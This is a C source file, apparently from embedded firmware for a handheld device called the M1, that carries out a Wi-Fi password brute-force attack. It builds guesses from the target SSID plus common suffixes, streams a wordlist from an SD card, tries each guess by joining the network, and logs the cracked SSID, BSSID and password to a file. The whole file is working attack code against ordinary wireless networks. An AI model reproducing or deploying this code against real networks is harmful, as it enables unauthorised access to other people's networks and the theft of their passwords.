/* See COPYING.txt for license details. */

/*
 * m1_wifi_attack.c — SD-backed wordlist iterator + AT+CWJAP wrapper.
 *
 * See m1_wifi_attack.h for usage. Streams the wordlist line-by-line so a
 * 50k+ candidate file fits in tiny RAM. A small in-memory ring tracks the
 * last 32 candidates we yielded, so the SSID-seed prefix doesn't get
 * trivially redelivered by the file portion.
 *
 * M1 Project
 */

#include "m1_wifi_attack.h"

#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "ff.h"
#include "esp_app_main.h"
#include "m1_log_debug.h"
#include "m1_sdcard.h"
#include "stm32h5xx_hal.h"
#define M1_LOGDB_TAG  "WIFAT"

#define SEED_MAX            6
#define DEDUP_RING          32
#define LINE_BUF            128
#define READ_CHUNK          512
#define DEFAULT_TRY_TO_SEC  8

struct m1_wifi_attack_iter_s {
    char    ssid[M1_WIFI_SSID_MAX];
    /* Pre-computed SSID-derived seeds. */
    char    seeds[SEED_MAX][M1_WIFI_PSK_MAX];
    int     seed_count;
    int     seed_idx;
    /* File state. */
    FIL    *fp;
    char    chunk[READ_CHUNK];
    int     chunk_len;
    int     chunk_pos;
    bool    eof;
    int     file_size;
    /* Dedup window (last N yielded). */
    char    recent[DEDUP_RING][M1_WIFI_PSK_MAX];
    int     recent_count;
    int     recent_head;
};

bool m1_wifi_psk_valid(const char *s)
{
    if (!s) return false;
    size_t n = strlen(s);
    if (n < 8 || n > 63) return false;
    for (size_t i = 0; i < n; i++)
    {
        unsigned char c = (unsigned char)s[i];
        if (c < 0x20 || c > 0x7E) return false;
    }
    return true;
}

static void seed_push(m1_wifi_attack_iter_t *it, const char *candidate)
{
    if (it->seed_count >= SEED_MAX) return;
    if (!m1_wifi_psk_valid(candidate)) return;
    for (int i = 0; i < it->seed_count; i++)
        if (strcmp(it->seeds[i], candidate) == 0) return;
    snprintf(it->seeds[it->seed_count], M1_WIFI_PSK_MAX, "%s", candidate);
    it->seed_count++;
}

static void build_seeds(m1_wifi_attack_iter_t *it)
{
    char buf[M1_WIFI_PSK_MAX];
    /* SSID itself. */
    seed_push(it, it->ssid);
    /* SSID + common suffixes (year, "123", "password"). */
    snprintf(buf, sizeof(buf), "%s123", it->ssid);     seed_push(it, buf);
    snprintf(buf, sizeof(buf), "%s2024", it->ssid);    seed_push(it, buf);
    snprintf(buf, sizeof(buf), "%s2025", it->ssid);    seed_push(it, buf);
    snprintf(buf, sizeof(buf), "%s2026", it->ssid);    seed_push(it, buf);
    snprintf(buf, sizeof(buf), "%spassword", it->ssid); seed_push(it, buf);
}

static bool recent_has(const m1_wifi_attack_iter_t *it, const char *s)
{
    for (int i = 0; i < it->recent_count; i++)
        if (strcmp(it->recent[i], s) == 0) return true;
    return false;
}

static void recent_add(m1_wifi_attack_iter_t *it, const char *s)
{
    snprintf(it->recent[it->recent_head], M1_WIFI_PSK_MAX, "%s", s);
    it->recent_head = (it->recent_head + 1) % DEDUP_RING;
    if (it->recent_count < DEDUP_RING) it->recent_count++;
}

m1_wifi_attack_iter_t *m1_wifi_attack_open(const char *target_ssid,
                                           size_t *out_seed_count)
{
    if (!target_ssid || !*target_ssid) return NULL;

    m1_wifi_attack_iter_t *it = calloc(1, sizeof(*it));
    if (!it) return NULL;
    snprintf(it->ssid, sizeof(it->ssid), "%s", target_ssid);
    build_seeds(it);

    if (m1_sdcard_get_status() != SD_access_OK) goto fail;
    static FIL s_fp;
    if (f_open(&s_fp, M1_WIFI_WORDLIST_PATH, FA_OPEN_EXISTING | FA_READ) != FR_OK)
    {
        M1_LOG_I(M1_LOGDB_TAG, "wordlist missing at " M1_WIFI_WORDLIST_PATH "\n\r");
        goto fail;
    }
    it->fp = &s_fp;
    it->file_size = (int)f_size(it->fp);
    if (out_seed_count) *out_seed_count = (size_t)it->seed_count;
    return it;

fail:
    /* Allow continuing with seeds only if SSID alone is a candidate. */
    if (out_seed_count) *out_seed_count = (size_t)it->seed_count;
    return it;
}

size_t m1_wifi_attack_total_estimate(const m1_wifi_attack_iter_t *it)
{
    if (!it) return 0;
    /* Average WPA password is ~10 chars; +1 for the newline. */
    size_t from_file = it->fp ? (size_t)(it->file_size / 11) : 0;
    return (size_t)it->seed_count + from_file;
}

/* Read one logical line from the streaming file into out (max out_size).
 * Returns false on EOF. CR/LF stripped. */
static bool read_line(m1_wifi_attack_iter_t *it, char *out, size_t out_size)
{
    if (!it->fp || it->eof || out_size == 0) return false;
    size_t out_pos = 0;
    while (true)
    {
        if (it->chunk_pos >= it->chunk_len)
        {
            UINT br = 0;
            if (f_read(it->fp, it->chunk, sizeof(it->chunk), &br) != FR_OK || br == 0)
            {
                it->eof = true;
                break;
            }
            it->chunk_len = (int)br;
            it->chunk_pos = 0;
        }
        char c = it->chunk[it->chunk_pos++];
        if (c == '\n') break;
        if (c == '\r') continue;
        if (out_pos < out_size - 1) out[out_pos++] = c;
    }
    out[out_pos] = '\0';
    return !(it->eof && out_pos == 0);
}

bool m1_wifi_attack_next(m1_wifi_attack_iter_t *it,
                         char *out, size_t out_size)
{
    if (!it || !out || out_size < M1_WIFI_PSK_MAX) return false;

    /* Yield seeds first. */
    while (it->seed_idx < it->seed_count)
    {
        const char *s = it->seeds[it->seed_idx++];
        if (!m1_wifi_psk_valid(s)) continue;
        if (recent_has(it, s)) continue;
        snprintf(out, out_size, "%s", s);
        recent_add(it, s);
        return true;
    }

    /* Then stream the file. */
    char line[LINE_BUF];
    while (read_line(it, line, sizeof(line)))
    {
        if (line[0] == '\0' || line[0] == '#') continue;
        if (!m1_wifi_psk_valid(line)) continue;
        if (recent_has(it, line)) continue;
        snprintf(out, out_size, "%s", line);
        recent_add(it, line);
        return true;
    }
    return false;
}

void m1_wifi_attack_close(m1_wifi_attack_iter_t *it)
{
    if (!it) return;
    if (it->fp) f_close(it->fp);
    free(it);
}

int m1_wifi_attack_try(const char *ssid, const char *pwd, int timeout_sec)
{
    if (!ssid || !pwd) return M1_WIFI_TRY_TRANSPORT;
    ctrl_cmd_t app = CTRL_CMD_DEFAULT_REQ();
    app.cmd_timeout_sec = timeout_sec > 0 ? timeout_sec : DEFAULT_TRY_TO_SEC;
    uint8_t r = wifi_try_connect(&app, ssid, pwd, app.cmd_timeout_sec);
    if (r != SUCCESS) return M1_WIFI_TRY_TRANSPORT;
    return app.u.wifi_try.try_status;
}

void m1_wifi_attack_record_hit(const char *ssid, const char *bssid,
                               const char *psk)
{
    FIL fp;
    if (m1_sdcard_get_status() != SD_access_OK) return;
    if (f_open(&fp, M1_WIFI_CRACKED_PATH, FA_OPEN_APPEND | FA_WRITE) != FR_OK)
        return;
    char line[160];
    int n = snprintf(line, sizeof(line),
                     "[%lu] ssid=\"%s\" bssid=%s psk=\"%s\"\n",
                     (unsigned long)HAL_GetTick(),
                     ssid ? ssid : "?",
                     bssid ? bssid : "?",
                     psk ? psk : "?");
    if (n > 0)
    {
        UINT bw = 0;
        f_write(&fp, line, (UINT)n, &bw);
    }
    f_close(&fp);
}
